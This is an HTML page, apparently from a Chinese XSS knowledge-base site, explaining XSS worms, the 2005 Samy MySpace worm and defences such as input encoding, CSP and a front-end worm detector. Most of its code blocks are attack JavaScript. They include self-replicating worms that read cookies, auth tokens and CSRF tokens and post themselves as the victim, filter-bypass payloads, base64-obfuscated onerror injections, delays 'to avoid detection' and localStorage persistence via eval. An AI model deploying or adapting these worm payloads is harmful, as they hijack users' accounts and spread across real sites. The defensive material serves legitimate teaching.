@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+    <title>XSS蠕虫攻击原理与实战 - XSS安全知识库</title>
+    <meta name="description" content="深入解析XSS蠕虫攻击原理、传播机制及经典案例。学习Samy蠕虫、百度空间蠕虫等真实攻击技术，掌握XSS蠕虫防御策略。">
+    <meta name="keywords" content="XSS蠕虫,XSS Worm,Samy蠕虫,自我传播XSS,蠕虫攻击,社交网络蠕虫,Web安全,XSS攻击">
+    <meta name="author" content="蓝莲花XSS平台">
+    <meta property="og:title" content="XSS蠕虫攻击原理与实战 - XSS安全知识库">
+    <meta property="og:description" content="从Samy蠕虫到现代社交网络蠕虫攻击，全面解析XSS蠕虫的技术原理与防御方法">
+    <meta property="og:type" content="article">
+    <title>XSS蠕虫攻击原理与实战 - XSS安全知识库</title>
+    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --bg-primary: #0a0e27;
+            --bg-secondary: #151932;
+            --text-primary: #e0e0e0;
+            --text-secondary: #b0b0b0;
+            --border-color: rgba(0, 255, 65, 0.2);
+            --cyan: #00d9ff;
+            --border-radius: 8px;
+            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-family); line-height: 1.7; }
+        .article-header { background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-primary) 100%); padding: 3rem 0; border-bottom: 2px solid var(--border-color); }
+        .breadcrumb { background: transparent; margin-bottom: 1.5rem; }
+        .breadcrumb-item { color: var(--text-secondary); }
+        .breadcrumb-item a { color: var(--neon-green); text-decoration: none; transition: all 0.3s ease; }
+        .breadcrumb-item a:hover { color: var(--cyan); }
+        .breadcrumb-item.active { color: var(--text-primary); }
+        .breadcrumb-item + .breadcrumb-item::before { color: var(--text-secondary); }
+        .article-title { font-size: 2.5rem; font-weight: 700; color: var(--neon-green); margin-bottom: 1rem; text-shadow: 0 0 20px rgba(0, 255, 65, 0.3); }
+        .article-meta { color: var(--text-secondary); font-size: 0.95rem; }
+        .article-meta span { margin-right: 1rem; }
+        .main-content { padding: 3rem 0; }
+        .toc { background: rgba(0, 255, 65, 0.05); border: 1px solid var(--border-color); border-radius: var(--border-radius); padding: 1.5rem; margin-bottom: 2rem; }
+        .toc h3 { color: var(--neon-green); font-size: 1.2rem; margin-bottom: 1rem; }
+        .toc ul { list-style: none; padding-left: 0; }
+        .toc ul li { margin-bottom: 0.5rem; }
+        .toc ul li a { color: var(--text-secondary); text-decoration: none; transition: all 0.3s ease; }
+        .toc ul li a:hover { color: var(--neon-green); padding-left: 10px; }
+        .article-content { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--border-radius); padding: 2rem; }
+        .article-content h2 { color: var(--neon-green); font-size: 1.8rem; margin: 2rem 0 1rem 0; padding-bottom: 0.5rem; border-bottom: 2px solid var(--border-color); }
+        .article-content h3 { color: var(--cyan); font-size: 1.4rem; margin: 1.5rem 0 1rem 0; }
+        .article-content h4 { color: var(--text-primary); font-size: 1.2rem; margin: 1rem 0 0.5rem 0; }
+        .article-content p { color: var(--text-secondary); margin-bottom: 1rem; }
+        .article-content ul, .article-content ol { color: var(--text-secondary); margin-bottom: 1rem; padding-left: 2rem; }
+        .article-content li { margin-bottom: 0.5rem; }
+        .article-content strong { color: var(--neon-green); }
+        .code-block { background: #1e1e1e; border: 1px solid var(--border-color); border-radius: var(--border-radius); margin: 1rem 0; overflow-x: auto; }
+        .code-block pre { margin: 0; padding: 1rem; }
+        .info-box { background: rgba(0, 217, 255, 0.1); border-left: 4px solid var(--cyan); padding: 1rem; margin: 1rem 0; border-radius: 4px; }
+        .warning-box { background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; margin: 1rem 0; border-radius: 4px; }
+        .danger-box { background: rgba(220, 53, 69, 0.1); border-left: 4px solid #dc3545; padding: 1rem; margin: 1rem 0; border-radius: 4px; }
+        .back-to-top { position: fixed; bottom: 40px; right: 40px; width: 50px; height: 50px; background: var(--neon-green); color: #000; border: none; border-radius: 50%; font-size: 1.5rem; cursor: pointer; opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 1000; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3); }
+        .back-to-top:hover { transform: translateY(-5px); box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5); }
+        .back-to-top.show { opacity: 1; visibility: visible; }
+    </style>
+</head>
+<body>
+    <div class="article-header">
+        <div class="container">
+            <nav aria-label="breadcrumb">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li>
+                    <li class="breadcrumb-item active">XSS蠕虫攻击原理与实战</li>
+                </ol>
+            </nav>
+            <h1 class="article-title">XSS蠕虫攻击原理与实战</h1>
+            <div class="article-meta">
+                <span><i class="far fa-calendar"></i> 2025年1月</span>
+                <span class="mx-3">|</span>
+                <span><i class="far fa-clock"></i> 25分钟阅读</span>
+                <span class="mx-3">|</span>
+                <span><i class="fas fa-tag"></i> 高级技术</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-10 offset-lg-1">
+                    <div class="toc">
+                        <h3><i class="fas fa-list"></i> 目录</h3>
+                        <ul>
+                            <li><a href="#intro">1. XSS蠕虫简介</a></li>
+                            <li><a href="#principle">2. 蠕虫传播原理</a></li>
+                            <li><a href="#samy">3. 经典案例：Samy蠕虫</a></li>
+                            <li><a href="#technical">4. 技术实现细节</a></li>
+                            <li><a href="#defense">5. 防御策略</a></li>
+                        </ul>
+                    </div>
+
+                    <div class="article-content">
+                        <h2 id="intro">1. XSS蠕虫简介</h2>
+                        <p>XSS蠕虫是一种能够自我复制和传播的恶意JavaScript代码。它利用存储型XSS漏洞，在用户访问被感染页面时自动执行，并将自身代码注入到其他用户的数据中，形成链式传播。</p>
+                        
+                        <div class="warning-box">
+                            <h4><i class="fas fa-exclamation-triangle"></i> 危害特征</h4>
+                            <ul>
+                                <li><strong>自动传播</strong>：无需人工干预，指数级扩散</li>
+                                <li><strong>影响范围广</strong>：可在短时间内感染大量用户</li>
+                                <li><strong>难以追踪</strong>：传播源头难以定位</li>
+                                <li><strong>持续性强</strong>：清除困难，易复发</li>
+                            </ul>
+                        </div>
+
+                        <h2 id="principle">2. 蠕虫传播原理</h2>
+                        <h3>2.1 传播流程</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// XSS蠕虫传播流程示意
+// 第一步：受害者A访问被感染页面
+访问者A -> 被感染的页面 -> 执行恶意代码
+
+// 第二步：恶意代码获取A的身份信息
+恶意代码 -> 读取Cookie/Token -> 获得A的权限
+
+// 第三步：使用A的身份发布蠕虫代码
+恶意代码 -> 以A身份发帖/评论 -> 注入蠕虫代码
+
+// 第四步：其他用户B访问A发布的内容
+访问者B -> 查看A的内容 -> 再次执行蠕虫代码
+
+// 循环传播：B重复上述过程感染C、D、E...
+</code></pre>
+                        </div>
+
+                        <h3>2.2 核心技术要素</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// XSS蠕虫核心代码结构
+var worm = {
+    // 1. 自我复制：获取自身代码
+    getSelfCode: function() {
+        // 从DOM中提取自身脚本
+        var scripts = document.getElementsByTagName('script');
+        for(var i = 0; i < scripts.length; i++) {
+            if(scripts[i].innerHTML.indexOf('worm') > -1) {
+                return scripts[i].innerHTML;
+            }
+        }
+    },
+    
+    // 2. 权限获取：读取用户凭证
+    getCredentials: function() {
+        return {
+            cookie: document.cookie,
+            token: localStorage.getItem('auth_token'),
+            csrf: document.querySelector('meta[name="csrf-token"]').content
+        };
+    },
+    
+    // 3. 传播功能：发布带蠕虫的内容
+    spread: function(code, creds) {
+        var payload = '<script>' + code + '</script>';
+        
+        // 使用AJAX以用户身份发帖
+        fetch('/api/post/create', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-Token': creds.csrf,
+                'Cookie': creds.cookie
+            },
+            body: JSON.stringify({
+                content: '看看这个有趣的内容！' + payload,
+                visibility: 'public'
+            })
+        });
+    },
+    
+    // 4. 执行传播
+    execute: function() {
+        var selfCode = this.getSelfCode();
+        var creds = this.getCredentials();
+        this.spread(selfCode, creds);
+    }
+};
+
+// 自动执行
+worm.execute();
+</code></pre>
+                        </div>
+
+                        <h2 id="samy">3. 经典案例：Samy蠕虫</h2>
+                        <h3>3.1 事件背景</h3>
+                        <p>2005年10月4日，Samy Kamkar创建了互联网历史上第一个XSS蠕虫，攻击目标是当时最流行的社交网络MySpace。在不到20小时内，超过100万用户被感染。</p>
+
+                        <div class="info-box">
+                            <h4><i class="fas fa-info-circle"></i> Samy蠕虫时间线</h4>
+                            <ul>
+                                <li><strong>0小时</strong>：Samy发布第一个被感染的个人页面</li>
+                                <li><strong>8小时</strong>：感染用户超过10,000人</li>
+                                <li><strong>16小时</strong>：感染用户超过500,000人</li>
+                                <li><strong>20小时</strong>：感染突破1,000,000人，MySpace紧急下线</li>
+                            </ul>
+                        </div>
+
+                        <h3>3.2 技术原理</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// Samy蠕虫简化版核心代码
+var samy = {
+    // 获取当前用户ID
+    getUserId: function() {
+        return document.URL.match(/\/profile\/(\d+)/)[1];
+    },
+    
+    // 添加Samy为好友
+    addFriend: function() {
+        var http = new XMLHttpRequest();
+        http.open('POST', '/api/addfriend', true);
+        http.send('friendID=11851658'); // Samy的ID
+    },
+    
+    // 在个人资料中写入"but most of all, samy is my hero"
+    updateProfile: function() {
+        var heroText = 'but most of all, samy is my hero';
+        var wormCode = this.getWormCode();
+        
+        var http = new XMLHttpRequest();
+        http.open('POST', '/api/updateprofile', true);
+        http.send('bio=' + encodeURIComponent(heroText + wormCode));
+    },
+    
+    // 获取蠕虫代码（使用巧妙的编码绕过过滤）
+    getWormCode: function() {
+        // 将<script>标签拆分以绕过过滤
+        var sc = String.fromCharCode(60, 115, 99, 114, 105, 112, 116); // <script
+        var et = String.fromCharCode(62); // >
+        return sc + et + document.getElementById('worm').innerHTML + '</script>';
+    },
+    
+    // 执行蠕虫
+    init: function() {
+        // 避免感染Samy自己
+        if(this.getUserId() != '11851658') {
+            this.addFriend();
+            this.updateProfile();
+        }
+    }
+};
+
+// 页面加载后自动执行
+window.onload = function() {
+    samy.init();
+};
+</code></pre>
+                        </div>
+
+                        <h3>3.3 绕过技术</h3>
+                        <p>MySpace对用户输入进行了过滤，但Samy使用了多种绕过技术：</p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 1. CSS表达式注入（IE浏览器特性）
+&lt;div style="background:url('javascript:eval(String.fromCharCode(...))')"&gt;
+
+// 2. 拆分关键字
+var tag = 'scr' + 'ipt';
+document.write('&lt;' + tag + '&gt;...&lt;/' + tag + '&gt;');
+
+// 3. 使用ASCII编码
+String.fromCharCode(60,115,99,114,105,112,116,62) // <script>
+
+// 4. 换行符绕过正则过滤
+java
+script:alert(1)
+
+// 5. 双写绕过
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+</code></pre>
+                        </div>
+
+                        <h2 id="technical">4. 技术实现细节</h2>
+                        <h3>4.1 现代XSS蠕虫示例</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 针对现代Web应用的XSS蠕虫
+(function() {
+    'use strict';
+    
+    // 防止重复感染
+    if(window.wormExecuted) return;
+    window.wormExecuted = true;
+    
+    // 蠕虫配置
+    const config = {
+        spreadAPI: '/api/posts/create',
+        targetUser: 'victim',
+        payload: getWormPayload()
+    };
+    
+    // 获取蠕虫完整代码
+    function getWormPayload() {
+        const scriptTag = document.currentScript || 
+                         document.querySelector('script[data-worm]');
+        return scriptTag ? scriptTag.innerHTML : '';
+    }
+    
+    // 获取CSRF Token
+    function getCSRFToken() {
+        const meta = document.querySelector('meta[name="csrf-token"]');
+        return meta ? meta.getAttribute('content') : '';
+    }
+    
+    // 传播蠕虫
+    async function propagate() {
+        try {
+            const response = await fetch(config.spreadAPI, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRF-Token': getCSRFToken()
+                },
+                credentials: 'include', // 包含Cookie
+                body: JSON.stringify({
+                    title: '精彩内容分享',
+                    content: '<img src=x onerror="' + 
+                             btoa(config.payload) + // Base64编码
+                             '.split(\\'\\').forEach(eval)">'
+                })
+            });
+            
+            if(response.ok) {
+                console.log('[Worm] Spread successful');
+            }
+        } catch(e) {
+            console.error('[Worm] Spread failed:', e);
+        }
+    }
+    
+    // 延迟执行避免检测
+    setTimeout(propagate, Math.random() * 5000 + 2000);
+})();
+</code></pre>
+                        </div>
+
+                        <h3>4.2 高级传播技术</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 1. 多目标传播
+function spreadMultiple() {
+    const targets = [
+        '/api/comment/add',
+        '/api/message/send',
+        '/api/profile/update',
+        '/api/wall/post'
+    ];
+    
+    targets.forEach(api => {
+        spreadToAPI(api);
+    });
+}
+
+// 2. 隐蔽传播（使用图片标签）
+function stealthSpread(code) {
+    const payload = '<img src=x onerror="eval(atob(\'' + 
+                    btoa(code) + '\'))">';
+    return payload;
+}
+
+// 3. 持久化存储
+function persistWorm() {
+    // 利用localStorage持久化
+    localStorage.setItem('theme_config', btoa(wormCode));
+    
+    // 在页面加载时恢复
+    window.addEventListener('load', function() {
+        eval(atob(localStorage.getItem('theme_config')));
+    });
+}
+
+// 4. 跨域传播（利用JSONP）
+function crossDomainSpread() {
+    const script = document.createElement('script');
+    script.src = 'https://target.com/api/callback?data=' + 
+                 encodeURIComponent(wormPayload);
+    document.body.appendChild(script);
+}
+</code></pre>
+                        </div>
+
+                        <h2 id="defense">5. 防御策略</h2>
+                        <h3>5.1 输入验证与输出编码</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 服务端：严格的输入过滤
+function sanitizeInput(input) {
+    // 移除所有脚本标签
+    input = input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
+    
+    // 移除事件处理器
+    input = input.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
+    
+    // 移除javascript:协议
+    input = input.replace(/javascript:/gi, '');
+    
+    // HTML实体编码
+    return escapeHtml(input);
+}
+
+function escapeHtml(text) {
+    const map = {
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#x27;'
+    };
+    return text.replace(/[&<>"']/g, m => map[m]);
+}
+</code></pre>
+                        </div>
+
+                        <h3>5.2 内容安全策略(CSP)</h3>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- 严格的CSP策略防止蠕虫执行 --&gt;
+&lt;meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; 
+               script-src 'self' 'nonce-{random}'; 
+               style-src 'self' 'unsafe-inline'; 
+               object-src 'none';"&gt;
+
+&lt;!-- 只允许带nonce的脚本执行 --&gt;
+&lt;script nonce="abc123"&gt;
+    // 合法脚本
+&lt;/script&gt;
+</code></pre>
+                        </div>
+
+                        <h3>5.3 监控与响应</h3>
+                        <div class="danger-box">
+                            <h4><i class="fas fa-shield-alt"></i> 蠕虫检测机制</h4>
+                            <ul>
+                                <li><strong>异常流量检测</strong>：监控短时间内大量相似的POST请求</li>
+                                <li><strong>内容模式识别</strong>：检测重复出现的可疑代码模式</li>
+                                <li><strong>用户行为分析</strong>：识别异常的发帖频率和内容相似度</li>
+                                <li><strong>实时告警</strong>：发现疑似蠕虫立即触发告警和隔离</li>
+                            </ul>
+                        </div>
+
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 前端：蠕虫行为检测
+class WormDetector {
+    constructor() {
+        this.suspiciousActivities = 0;
+        this.monitor();
+    }
+    
+    monitor() {
+        // 检测异常的网络请求
+        const originalFetch = window.fetch;
+        window.fetch = (...args) => {
+            this.checkRequest(args[0], args[1]);
+            return originalFetch.apply(window, args);
+        };
+        
+        // 检测异常的DOM操作
+        const observer = new MutationObserver(mutations => {
+            mutations.forEach(mutation => {
+                this.checkMutation(mutation);
+            });
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    }
+    
+    checkRequest(url, options) {
+        // 检测短时间内重复请求
+        const key = `${url}_${JSON.stringify(options)}`;
+        const now = Date.now();
+        
+        if(this.lastRequest && this.lastRequest.key === key) {
+            const timeDiff = now - this.lastRequest.time;
+            if(timeDiff < 1000) { // 1秒内重复请求
+                this.suspiciousActivities++;
+                this.alert('Suspicious rapid requests detected');
+            }
+        }
+        
+        this.lastRequest = { key, time: now };
+    }
+    
+    alert(message) {
+        console.error('[Security Alert]', message);
+        // 向服务器报告
+        navigator.sendBeacon('/api/security/report', JSON.stringify({
+            type: 'worm_activity',
+            message: message,
+            timestamp: Date.now()
+        }));
+    }
+}
+
+new WormDetector();
+</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer style="background: var(--bg-secondary); padding: 2rem 0; margin-top: 3rem; border-top: 2px solid var(--border-color); text-align: center; color: var(--text-secondary);">
+        <div class="container">
+            <p>&copy; 2025 蓝莲花XSS平台. All rights reserved.</p>
+        </div>
+    </footer>
+    
+    <!-- 回到顶部按钮 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="../static/libs/prism/js/prism.min.js"></script>
+    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
+    <script src="../static/libs/prism/js/prism-markup.min.js"></script>
+    <script src="../static/libs/prism/js/prism-php.min.js"></script>
+    <script>
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
